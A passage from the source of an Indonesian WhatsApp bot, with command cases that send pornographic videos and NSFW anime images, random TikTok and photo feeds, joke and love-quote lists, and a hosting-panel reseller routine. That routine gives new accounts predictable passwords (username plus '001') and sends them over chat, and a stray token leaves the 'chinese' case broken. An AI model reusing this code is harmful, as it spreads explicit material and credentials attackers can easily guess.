let ntahlah12 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Harley-Quinn-in-GCPD-cell-With-makeup.mp4`)
Kyyhst.sendMessage(from, { video: ntahlah12, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep13':
if (!isCreator&&!isPrem) return reply(`OnlyPremium`)
let ntahlah13 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Harley-Quinn-in-GCPD-cell.mp4`)
Kyyhst.sendMessage(from, { video: ntahlah13, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep14':
if (!isCreator&&!isPrem) return reply(`OnlyPremium`)
//if (!isGroup) return onlyGroup()
let ntahlah14 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Callie-working-in-Hooters.mp4`)
Kyyhst.sendMessage(from, { video: ntahlah14, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep15':
if (!isCreator&&!isPrem) return reply(`OnlyPremium`)
//if (!isGroup) return onlyGroup()
let ntahlah15 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Siona-taking-it-deep.mp4`)
Kyyhst.sendMessage(from, { video: ntahlah15, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep16':
if (!isCreator&&!isPrem) return reply(`OnlyPremium`)
//if (!isGroup) return onlyGroup()
let ntahlah16 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Ballerina-bot-facial.mp4`)
Kyyhst.sendMessage(from, { video: ntahlah16, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep17':
if (!isCreator&&!isPrem) return reply(`OnlyPremium`)
//if (!isGroup) return onlyGroup()
let ntahlah17 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Nyotengu-riding-with-help.mp4`)
Kyyhst.sendMessage(from, { video: ntahlah17, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep18':
if (!isCreator&&!isPrem) return reply(`OnlyPremium`)
//if (!isGroup) return onlyGroup()
let ntahlah18 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/2B-outdoor-reverse-cowgirl-Sound-update.mp4`)
Kyyhst.sendMessage(from, { video: ntahlah18, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
    /* 
𝗕𝗔𝗧𝗔𝗦 𝗖𝗔𝗦𝗘 𝗧𝗘𝗠𝗣𝗔𝗧 𝗕𝗢𝗞𝗘𝗣 𝗠𝗘𝗡𝗨
𝗕𝗬 𝗞𝗬𝗬𝗫𝗗
𝗔𝗞𝗔𝗠𝗘 𝗔𝗜
*/




//============================================================\\
    //  𝗔 𝗦 𝗨 𝗣 𝗔 𝗡    -         𝗠 𝗘 𝗡 𝗨
//============================================================\\
case 'tiktokgirl':
var asupan = JSON.parse(fs.readFileSync('./system/tiktokvids/tiktokgirl.json'))
var ii = pickRandom(asupan)
Kyyhst.sendMessage(m.chat, { caption: mess.success, video: { url: ii.url }}, { quoted: m })
break
case 'tiktokghea':
var gheayubi = JSON.parse(fs.readFileSync('./system/tiktokvids/gheayubi.json'))
var iii = pickRandom(gheayubi)
Kyyhst.sendMessage(m.chat, { caption: mess.success, video: { url: iii.url }}, { quoted: m })
break
case 'tiktokbocil':
var bocil = JSON.parse(fs.readFileSync('./system/tiktokvids/bocil.json'))
var iiii = pickRandom(bocil)
Kyyhst.sendMessage(m.chat, { caption: mess.success, video: { url: iiii.url }}, { quoted: m })
break
case 'tiktoknukhty':
var ukhty = JSON.parse(fs.readFileSync('./system/tiktokvids/ukhty.json'))
var iiiii = pickRandom(ukhty)
Kyyhst.sendMessage(m.chat, { caption: mess.success, video: { url: iiiii.url }}, { quoted: m })
break
case 'tiktoksantuy':
var santuy = JSON.parse(fs.readFileSync('./system/tiktokvids/santuy.json'))
var iiiiii = pickRandom(santuy)
Kyyhst.sendMessage(m.chat, { caption: mess.success, video: { url: iiiiii.url }}, { quoted: m })
break
case 'tiktokkayes':
var kayes = JSON.parse(fs.readFileSync('./system/tiktokvids/kayes.json'))
var iiiiiii = pickRandom(kayes)
Kyyhst.sendMessage(m.chat, { caption: mess.success, video: { url: iiiiiii.url }}, { quoted: m })
break
case 'tiktokpanrika':
var rikagusriani = JSON.parse(fs.readFileSync('./system/tiktokvids/panrika.json'))
var iiiiiiii = pickRandom(rikagusriani)
Kyyhst.sendMessage(m.chat, { caption: mess.success, video: { url: iiiiiiii.url }}, { quoted: m })
break
case 'tiktoknotnot':
var notnot = JSON.parse(fs.readFileSync('./system/tiktokvids/notnot.json'))
var iiiiiiiii = pickRandom(notnot)
Kyyhst.sendMessage(m.chat, { caption: mess.success, video: { url: iiiiiiiii.url }}, { quoted: m })
break
case 'chinese':
indo
var notnot = JSON.parse(fs.readFileSync('./system/tiktokpics/china.json'))
var iiiiiiiiii = pickRandom(notnot)
Kyyhst.sendMessage(m.chat, { caption: mess.success, image: { url: iiiiiiiiii.url } }, { quoted: m })
break
case 'hijab':
var notnot = JSON.parse(fs.readFileSync('./system/tiktokpics/hijab.json'))
var iiiiiiiiiii = pickRandom(notnot)
Kyyhst.sendMessage(m.chat, { caption: mess.success, image: { url: iiiiiiiiiii.url } }, { quoted: m })
break
case 'indo':
var notnot = JSON.parse(fs.readFileSync('./system/tiktokpics/indonesia.json'))
var iiiiiiiiiiii = pickRandom(notnot)
Kyyhst.sendMessage(m.chat, { caption: mess.success, image: { url: iiiiiiiiiiii.url } }, { quoted: m })
break
case 'japanese':
var notnot = JSON.parse(fs.readFileSync('./system/tiktokpics/japan.json'))
var iiiiiiiiiiiii = pickRandom(notnot)
Kyyhst.sendMessage(m.chat, { caption: mess.success, image: { url: iiiiiiiiiiiii.url } }, { quoted: m })
break
case 'korean':
var notnot = JSON.parse(fs.readFileSync('./system/tiktokpics/korea.json'))
var iiiiiiiiiiiiii = pickRandom(notnot)
Kyyhst.sendMessage(m.chat, { caption: mess.success, image: { url: iiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'malay':
var notnot = JSON.parse(fs.readFileSync('./system/tiktokpics/malaysia.json'))
var iiiiiiiiiiiiiii = pickRandom(notnot)
Kyyhst.sendMessage(m.chat, { caption: mess.success, image: { url: iiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'randomgirl':
var notnot = JSON.parse(fs.readFileSync('./system/tiktokpics/random.json'))
var iiiiiiiiiiiiiiii = pickRandom(notnot)
Kyyhst.sendMessage(m.chat, { caption: mess.success, image: { url: iiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'randomboy':
var notnot = JSON.parse(fs.readFileSync('./system/tiktokpics/random2.json'))
var iiiiiiiiiiiiiiiii = pickRandom(notnot)
Kyyhst.sendMessage(m.chat, { caption: mess.success, image: { url: iiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'thai':
var notnot = JSON.parse(fs.readFileSync('./system/tiktokpics/thailand.json'))
var iiiiiiiiiiiiiiiiii = pickRandom(notnot)
Kyyhst.sendMessage(m.chat, { caption: mess.success, image: { url: iiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'vietnamese':
var notnot = JSON.parse(fs.readFileSync('./system/tiktokpics/vietnam.json'))
var iiiiiiiiiiiiiiiiiii = pickRandom(notnot)
Kyyhst.sendMessage(m.chat, { caption: mess.success, image: { url: iiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'aesthetic':

reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./system/randompics/aesthetic.json'))
var iiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
Kyyhst.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'antiwork':

reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./system/resource/randompics/antiwork.json'))
var iiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
Kyyhst.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'blackpink2':

reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./system/resource/randompics/blackpink.json'))
var iiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
Kyyhst.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'bike':

reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./system/resource/randompics/bike.json'))
var iiiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
Kyyhst.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'boneka':

reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./system/resource/randompics/boneka.json'))
var iiiiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
Kyyhst.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'cosplay':

reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./resource/randompics/cosplay.json'))
var iiiiiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
Kyyhst.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'cat':

reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./system/resource/randompics/cat.json'))
var iiiiiiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
Kyyhst.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'doggo':

reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./system/resource/randompics/doggo.json'))
var iiiiiiiiiiiiiiiiiiiiiiiiiil = pickRandom(notnot)
Kyyhst.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiiiiiil.url } }, { quoted: m })
break
case 'justina':

reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./system/resource/randompics/justina.json'))
var iiiiiiiiiiiiiiiiiiiiiiiiiill = pickRandom(notnot)
Kyyhst.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiiiiiill.url } }, { quoted: m })
break

case 'kayes':

reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./system/resource/randompics/kayes.json'))
var iiiiiiiiiiiiiiiiiiiiiiiiiilll = pickRandom(notnot)
Kyyhst.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiiiiiilll.url } }, { quoted: m })
break
case 'kpop':

reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./system/resource/randompics/kpop.json'))
var ll = pickRandom(notnot)
Kyyhst.sendMessage(m.chat, { caption: 'don banh', image: { url: ll.url } }, { quoted: m })
break
case 'notnot':

reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./system/resource/randompics/notnot.json'))
var lll = pickRandom(notnot)
Kyyhst.sendMessage(m.chat, { caption: 'don banh', image: { url: lll.url } }, { quoted: m })
break
case 'car':

reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./system/resource/randompics/car.json'))
var llll = pickRandom(notnot)
Kyyhst.sendMessage(m.chat, { caption: 'don banh', image: { url: llll.url } }, { quoted: m })
break
case 'couplepic':case 'couplepicture':

reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./system/resource/randompics/ppcouple.json'))
var lllll = pickRandom(notnot)
Kyyhst.sendMessage(m.chat, { caption: 'don banh', image: { url: lllll.url } }, { quoted: m })
break
case 'profilepic': case 'profilepicture':

reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./system/resource/randompics/profile.json'))
var llllll = pickRandom(notnot)
Kyyhst.sendMessage(m.chat, { caption: 'don banh', image: { url: llllll.url } }, { quoted: m })
break
case 'pubg':

reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./system/resource/randompics/pubg.json'))
var lllllll = pickRandom(notnot)
Kyyhst.sendMessage(m.chat, { caption: 'don banh', image: { url: lllllll.url } }, { quoted: m })
break
case 'rose':

reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./system/resource/randompics/rose.json'))
var llllllll = pickRandom(notnot)
Kyyhst.sendMessage(m.chat, { caption: 'don banh', image: { url: llllllll.url } }, { quoted: m })
break
case 'ryujin':

reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./system/resource/randompics/ryujin.json'))
var lllllllll = pickRandom(notnot)
Kyyhst.sendMessage(m.chat, { caption: 'don banh', image: { url: lllllllll.url } }, { quoted: m })
break
case 'ulzzangboy':

reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./system/resource/randompics/ulzzangboy.json'))
var llllllllll = pickRandom(notnot)
Kyyhst.sendMessage(m.chat, { caption: 'don banh', image: { url: llllllllll.url } }, { quoted: m })
break
case 'ulzzanggirl':

reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./system/resource/randompics/ulzzanggirl.json'))
var lllllllllll = pickRandom(notnot)
Kyyhst.sendMessage(m.chat, { caption: 'don banh', image: { url: lllllllllll.url } }, { quoted: m })
break
case 'wallml': case 'wallpaperml':case 'mobilelegend':

reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./system/resource/randompics/wallml.json'))
var llllllllllll = pickRandom(notnot)
Kyyhst.sendMessage(m.chat, { caption: 'don banh', image: { url: llllllllllll.url } }, { quoted: m })
break
case 'wallpaperphone': case 'wallphone':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./system/resource/randompics/wallhp.json'))
var lllllllllllll = pickRandom(notnot)
Kyyhst.sendMessage(m.chat, { caption: 'don banh', image: { url: lllllllllllll.url } }, { quoted: m })
break
case 'hentai-neko' :
case 'hentai':
case 'hneko' :

 let waifudd2 = await axios.get(`https://waifu.pics/api/nsfw/neko`)
Kyyhst.sendMessage(m.chat, { caption: "Done 🍏", image: { url:waifudd2.data.url } }, { quoted: m })
break
case 'hentai-waifu' :
case 'nwaifu' :

await Kyyhst.sendMessage(m.chat, {react: {text: '🥵', key: m.key}})
 let waifudd3 = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
Kyyhst.sendMessage(m.chat, { caption: "Done 🍏", image: { url:waifudd3.data.url } }, { quoted: m })
break
case 'gasm':

await Kyyhst.sendMessage(m.chat, {react: {text: '🥵', key: m.key}})						
 let waifudd4 = await axios.get(`https://nekos.life/api/v2/img/${command}`)
Kyyhst.sendMessage(m.chat, { caption: "Done 🍏", image: { url:waifudd4.data.url } }, { quoted: m })
break 
case 'milf':

await Kyyhst.sendMessage(m.chat, {react: {text: '🥵', key: m.key}})
var ahegaonsfw = JSON.parse(fs.readFileSync('./system/resource/nsfw/milf.json'))
var kymyresult = pickRandom(ahegaonsfw)
Kyyhst.sendMessage(m.chat, { caption: "Done 🍏", image: { url: kymyresult.url } }, { quoted: m })
break 
case 'animespank':				
 let waifudd5 = await await axios.get(`https://nekos.life/api/v2/img/spank`) 
 Kyyhst.sendMessage(m.chat, { caption: `Here you go!`, image: {url:waifudd5.data.url} },{ quoted:m }).catch(err => {
 return('Error!')
 })
break
    /* 
𝗕𝗔𝗧𝗔𝗦 𝗖𝗔𝗦𝗘 𝗧𝗘𝗠𝗣𝗔𝗧 𝗔𝗦𝗨𝗣𝗔𝗡 𝗠𝗘𝗡𝗨
𝗕𝗬 𝗞𝗬𝗬𝗫𝗗
𝗔𝗞𝗔𝗠𝗘 𝗔𝗜
*/




//============================================================\\
    //  𝗖 𝗣 𝗔 𝗡 𝗘 𝗟   -         𝗠 𝗘 𝗡 𝗨
//============================================================\\
case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": 
case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": 
case "unlimited": case "unli": {
    if (!isCreator && !isPrem) {
        return m.reply(`Fitur ini hanya untuk dalam grup *reseller panel*!\nJoin grup *reseller panel* langsung chat ${global.owner}`);
    }
    if (!text) return example("username,628XXX");

    let nomor, usernem;
    let tek = text.split(",");
    if (tek.length > 1) {
        let [users, nom] = tek.map(t => t.trim());
        if (!users || !nom) return example("username,628XXX");
        nomor = nom.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        usernem = users.toLowerCase();
    } else {
        usernem = text.toLowerCase();
        nomor = m.isGroup ? m.sender : m.chat
    }

    try {
        var onWa = await Kyyhst.onWhatsApp(nomor.split("@")[0]);
        if (onWa.length < 1) return m.reply("Nomor target tidak terdaftar di WhatsApp!");
    } catch (err) {
        return m.reply("Terjadi kesalahan saat mengecek nomor WhatsApp: " + err.message);
    }

    // Mapping RAM, Disk, dan CPU
    const resourceMap = {
        "1gb": { ram: "1000", disk: "1000", cpu: "40" },
        "2gb": { ram: "2000", disk: "1000", cpu: "60" },
        "3gb": { ram: "3000", disk: "2000", cpu: "80" },
        "4gb": { ram: "4000", disk: "2000", cpu: "100" },
        "5gb": { ram: "5000", disk: "3000", cpu: "120" },
        "6gb": { ram: "6000", disk: "3000", cpu: "140" },
        "7gb": { ram: "7000", disk: "4000", cpu: "160" },
        "8gb": { ram: "8000", disk: "4000", cpu: "180" },
        "9gb": { ram: "9000", disk: "5000", cpu: "200" },
        "10gb": { ram: "10000", disk: "5000", cpu: "220" },
        "unlimited": { ram: "0", disk: "0", cpu: "0" }
    };
    
    let { ram, disk, cpu } = resourceMap[command] || { ram: "0", disk: "0", cpu: "0" };

    let username = usernem.toLowerCase();
    let email = username + "@gmail.com";
    let name = capital(username) + " Server";
    let password = username + "001";

    try {
        let f = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: { "Accept": "application/json", "Content-Type": "application/json", "Authorization": "Bearer " + apikey },
            body: JSON.stringify({ email, username, first_name: name, last_name: "Server", language: "en", password })
        });
        let data = await f.json();
        if (data.errors) return m.reply("Error: " + JSON.stringify(data.errors[0], null, 2));
        let user = data.attributes;

        let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
            method: "GET",
            headers: { "Accept": "application/json", "Content-Type": "application/json", "Authorization": "Bearer " + apikey }
        });
        let data2 = await f1.json();
        let startup_cmd = data2.attributes.startup;

        let f2 = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: { "Accept": "application/json", "Content-Type": "application/json", "Authorization": "Bearer " + apikey },
            body: JSON.stringify({
                name,
                description: tanggal(Date.now()),
                user: user.id,
                egg: parseInt(egg),
                docker_image: "ghcr.io/parkervcp/yolks:nodejs_20",
                startup: startup_cmd,
                environment: { INST: "npm", USER_UPLOAD: "0", AUTO_UPDATE: "0", CMD_RUN: "npm start" },
                limits: { memory: ram, swap: 0, disk, io: 500, cpu },
                feature_limits: { databases: 5, backups: 5, allocations: 5 },
                deploy: { locations: [parseInt(loc)], dedicated_ip: false, port_range: [] },
            })
        });
        let result = await f2.json();
        if (result.errors) return m.reply("Error: " + JSON.stringify(result.errors[0], null, 2));
        
        let server = result.attributes;
        var orang = nomor
        if (m.isGroup) {
        await m.reply(`Berhasil membuat akun panel ✅\ndata akun sudah di kirim ke ${nomor == m.sender ? "private chat" : nomor.split("@")[0]}`)
        }        
        if (nomor !== m.sender && !m.isGroup) {
        await m.reply(`Berhasil membuat akun panel ✅\ndata akun sudah di kirim ke ${nomor.split("@")[0]}`)
        }
        
        let teks = `
*Berikut Detail Akun Panel Kamu 📦*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}
*🗓️ ${tanggal(Date.now())}*

*🌐 Spesifikasi Server*
* Ram : *${ram == "0" ? "Unlimited" : ram / 1000 + "GB"}*
* Disk : *${disk == "0" ? "Unlimited" : disk / 1000 + "GB"}*
* CPU : *${cpu == "0" ? "Unlimited" : cpu + "%"}*
* ${global.domain}

*Syarat & Ketentuan :*
* Expired panel 1 bulan
* Simpan data ini sebaik mungkin
* Garansi pembelian 15 hari (1x replace)
* Claim garansi wajib membawa bukti chat pembelian
`;

        await Kyyhst.sendMessage(orang, { text: teks }, { quoted: m });
    } catch (err) {
        return m.reply("Terjadi kesalahan: " + err.message);
    }
}
break
   /* 
𝗕𝗔𝗧𝗔𝗦 𝗖𝗔𝗦𝗘 𝗧𝗘𝗠𝗣𝗔𝗧 𝗖𝗣𝗔𝗡𝗘𝗟 𝗠𝗘𝗡𝗨
𝗕𝗬 𝗞𝗬𝗬𝗫𝗗
𝗔𝗞𝗔𝗠𝗘 𝗔𝗜
*/





//============================================================\\
    //  𝗤 𝗨 𝗢 𝗧 𝗘 𝗦  -         𝗠 𝗘 𝗡 𝗨
//============================================================\\
case 'quotesanime':
case 'quotesanim': {
 let res = await (await fetch('https://katanime.vercel.app/api/getrandom?limit=1'))
 if (!res.ok) return await res.text()
 let json = await res.json()
 if(!json.result[0]) return json
 let { indo, character, anime } = json.result[0]
 reply(`${indo}\n\n📮By: ${character} \nAnime:\n${anime}`)
}
break

case 'quotesbacot': {
function pickRandom(list) {
 return list[Math.floor(list.length * Math.random())]
}

const bacot = [
'Kamu suka kopi nggak? Aku sih suka. Tau kenapa alesannya? Kopi itu ibarat kamu, pahit sih tapi bikin candu jadi pingin terus.',
'Gajian itu kayak mantan ya? Bisanya cuman lewat sebentar saja.',
'Kata pak haji, cowok yang nggak mau pergi Sholat Jumat disuruh pakai rok aja.',
'Kamu tahu mantan nggak? Mantan itu ibarat gajian, biasa numpang lewat dong di kehidupan kita.',
'Aku suka kamu, kamu suka dia, tapi dia sayangnya nggak ke kamu. Wkwkw lucu ya? Cinta serumit ini.',
'Google itu hebat ya? Tapi sayang sehebat-hebatnya Google nggak bisa menemukan jodoh kita.',
'Terlalu sering memegang pensil alis dapat membuat mata menjadi buta, jika dicolok-colokkan ke mata.',
'Saya bekerja keras karena sadar kalau uang nggak punya kaki buat jalan sendiri ke kantong saya.',
'Jika kamu tak mampu meyakinkan dan memukau orang dengan kepintaranmu, bingungkan dia dengan kebodohanmu.',
'Selelah-lelahnya bekerja, lebih lelah lagi kalau nganggur.',
'Kita hidup di masa kalau salah kena marah, pas bener dibilang tumben.',
'Nggak ada bahu pacar? Tenang aja, masih ada bahu jalan buat nyandar.',
'Mencintai dirimu itu wajar, yang gak wajar mencintai bapakmu.',
'Katanya enggak bisa bohong. Iyalah, mata kan cuma bisa melihat.',
'Madu di tangan kananmu, racun di tangan kirimu, jodoh tetap di tangan tuhan.',
'Selingkuh terjadi bukan karena ada niat, selingkuh terjadi karna pacar kamu masih laku.',
'Netizen kalau senam jempol di ponsel nggak pakai pendinginan, pantes komennya bikin panas terus.',
'Jodoh memang enggak kemana, tapi saingannya ada dimana-mana.',
'Perasaan aku salah terus di matamu. Kalu gitu, besok aku pindah ke hidungmu.',
'Jomblo tidak perlu malu, jomblo bukan berarti tidak laku, tapi memang tidak ada yang mau.',
'Jika doamu belum terkabul maka bersabar, ingatlah bahwa yang berdoa bukan cuma kamu!',
'Masih berharap dan terus berharap lama-lama aku jadi juara harapan.',
'Manusia boleh berencana, tapi akhirnya saldo juga yang menentukan.',
'Statusnya rohani, kelakuannya rohalus.',
'Kegagalan bukan suatu keberhasilan.',
'Tadi mau makan bakso, cuma kok panas banget, keliatannya baksonya lagi demam.',
'Aku juga pernah kaya, waktu gajian.',
'Aku diputusin sama pacar karena kita beda keyakinan. Aku yakin kalau aku ganteng, tapi dia enggak.',
'Masa depanmu tergantung pada mimpimu, maka perbanyaklah tidur.',
'Seberat apapun pekerjaanmu, akan semakin ringan jika tidak dibawa.',
'Jangan terlalu berharap! nanti jatuhnya sakit!',
'Ingat! Anda itu jomblo',
'Gak tau mau ngetik apa',
]
 let bacotan = pickRandom(bacot)
 reply(bacotan)
}
break
//=========================================\\======

case 'quotesbucin': {
const bucin = [
 "Aku memilih untuk sendiri, bukan karena menunggu yang sempurna, tetapi butuh yang tak pernah menyerah.",
 "Seorang yang single diciptakan bersama pasangan yang belum ditemukannya.",
 "Jomblo. Mungkin itu cara Tuhan untuk mengatakan 'Istirahatlah dari cinta yang salah'.",
 "Jomblo adalah anak muda yang mendahulukan pengembangan pribadinya untuk cinta yang lebih berkelas nantinya.",
 "Aku bukan mencari seseorang yang sempurna, tapi aku mencari orang yang menjadi sempurna berkat kelebihanku.",
 "Pacar orang adalah jodoh kita yang tertunda.",
 "Jomblo pasti berlalu. Semua ada saatnya, saat semua kesendirian menjadi sebuah kebersamaan dengannya kekasih halal. Bersabarlah.",
 "Romeo rela mati untuk juliet, Jack mati karena menyelamatkan Rose. Intinya, kalau tetap mau hidup, jadilah single.",
 "Aku mencari orang bukan dari kelebihannya tapi aku mencari orang dari ketulusan hatinya.",
 "Jodoh bukan sendal jepit, yang kerap tertukar. Jadi teruslah berada dalam perjuangan yang semestinya.",
 "Kalau kamu jadi senar gitar, aku nggak mau jadi gitarisnya. Karena aku nggak mau mutusin kamu.",
 "Bila mencintaimu adalah ilusi, maka izinkan aku berimajinasi selamanya.",
 "Sayang... Tugas aku hanya mencintaimu, bukan melawan takdir.",
 "Saat aku sedang bersamamu rasanya 1 jam hanya 1 detik, tetapi jika aku jauh darimu rasanya 1 hari menjadi 1 tahun.",
 "Kolak pisang tahu sumedang, walau jarak membentang cintaku takkan pernah hilang.",
 "Aku ingin menjadi satu-satunya, bukan salah satunya.",
 "Aku tidak bisa berjanji untuk menjadi yang baik. Tapi aku berjanji akan selalu mendampingi kamu.",
 "Kalau aku jadi wakil rakyat aku pasti gagal, gimana mau mikirin rakyat kalau yang selalu ada dipikiran aku hanyalah dirimu.",
 "Lihat kebunku, penuh dengan bunga. Lihat matamu, hatiku berbunga-bunga.",
 "Berjanjilah untuk terus bersamaku sekarang, esok, dan selamanya.",
 "Rindu tidak hanya muncul karena jarak yang terpisah. Tapi juga karena keinginan yang tidak terwujud.",
 "Kamu tidak akan pernah jauh dariku, kemanapun aku pergi kamu selalu ada, karena kamu selalu di hatiku, yang jauh hanya raga kita bukan hati kita.",
 "Aku tahu dalam setiap tatapanku, kita terhalang oleh jarak dan waktu. Tapi aku yakin kalau nanti kita pasti bisa bersatu.",
 "Merindukanmu tanpa pernah bertemu sama halnya dengan menciptakan lagu yang tak pernah ternyayikan.",
 "Ada kalanya jarak selalu menjadi penghalang antara aku sama kamu, namun tetap saja di hatiku kita selalu dekat.",
 "Jika hati ini tak mampu membendung segala kerinduan, apa daya tak ada yang bisa aku lakukan selain mendoakanmu.",
 "Mungkin di saat ini aku hanya bisa menahan kerinduan ini. Sampai tiba saatnya nanti aku bisa bertemu dan melepaskan kerinduan ini bersamamu.",
 "Melalui rasa rindu yang bergejolak dalam hati, di situ terkadang aku sangat membutuhkan dekap peluk kasih sayangmu.",
 "Dalam dinginnya malam, tak kuingat lagi; Berapa sering aku memikirkanmu juga merindukanmu.",
 "Merindukanmu itu seperti hujan yang datang tiba-tiba dan bertahan lama. Dan bahkan setelah hujan reda, rinduku masih terasa.",
 "Sejak mengenalmu bawaannya aku pengen belajar terus, belajar menjadi yang terbaik buat kamu.",
 "Tahu gak perbedaan pensi sama wajah kamu? Kalau pensil tulisannya bisa dihapus, tapi kalau wajah kamu gak akan ada yang bisa hapus dari pikiran aku.",
 "Bukan Ujian Nasional besok yang harus aku khawatirkan, tapi ujian hidup yang aku lalui setelah kamu meninggalkanku.",
 "Satu hal kebahagiaan di sekolah yang terus membuatku semangat adalah bisa melihat senyumanmu setiap hari.",
 "Kamu tahu gak perbedaanya kalau ke sekolah sama ke rumah kamu? Kalo ke sekolah pasti yang di bawa itu buku dan pulpen, tapi kalo ke rumah kamu, aku cukup membawa hati dan cinta.",
 "Aku gak sedih kok kalo besok hari senin, aku sedihnya kalau gak ketemu kamu.",
 "Momen cintaku tegak lurus dengan momen cintamu. Menjadikan cinta kita sebagai titik ekuilibrium yang sempurna.",
 "Aku rela ikut lomba lari keliling dunia, asalkan engkai yang menjadi garis finishnya.",
 "PR-ku adalah merindukanmu. Lebih kuat dari Matematika, lebih luas dari Fisika, lebih kerasa dari Biologi.",
 "Cintaku kepadamu itu bagaikan metabolisme, yang gak akan berhenti sampai mati.",
 "Kalau jelangkungnya kaya kamu, dateng aku jemput, pulang aku anter deh.",
 "Makan apapun aku suka asal sama kamu, termasuk makan ati.",
 "Cinta itu kaya hukuman mati. Kalau nggak ditembak, ya digantung.",
 "Mencintaimu itu kayak narkoba: sekali coba jadi candu, gak dicoba bikin penasaran, ditinggalin bikin sakaw.",
 "Gue paling suka ngemil karena ngemil itu enak. Apalagi ngemilikin kamu sepenuhnya...",
 "Dunia ini cuma milik kita berdua. Yang lainnya cuma ngontrak.",
 "Bagi aku, semua hari itu adalah hari Selasa. Selasa di Surga bila dekat denganmu...",
 "Bagaimana kalau kita berdua jadi komplotan penjahat? Aku curi hatimu dan kamu curi hatiku.",
 "Kamu itu seperti kopi yang aku seruput pagi ini. Pahit, tapi bikin nagih.",
 "Aku sering cemburu sama lipstikmu. Dia bisa nyium kamu tiap hari, dari pagi sampai malam.",
 "Hanya mendengar namamu saja sudah bisa membuatku tersenyum seperti orang bodoh.",
 "Aku tau teman wanitamu bukan hanya satu, dan menyukaimu pun bukan hanya aku.",
 "Semenjak aku berhenti berharap pada dirimu, aku jadi tidak semangat dalam segala hal..",
 "Denganmu, jatuh cinta adalah patah hati paling sengaja.",
 "Sangat sulit merasakan kebahagiaan hidup tanpa kehadiran kamu disisiku.",
 "Melalui rasa rindu yang bergejolak dalam hati, di situ terkadang aku sangat membutuhkan dekap peluk kasih sayangmu.",
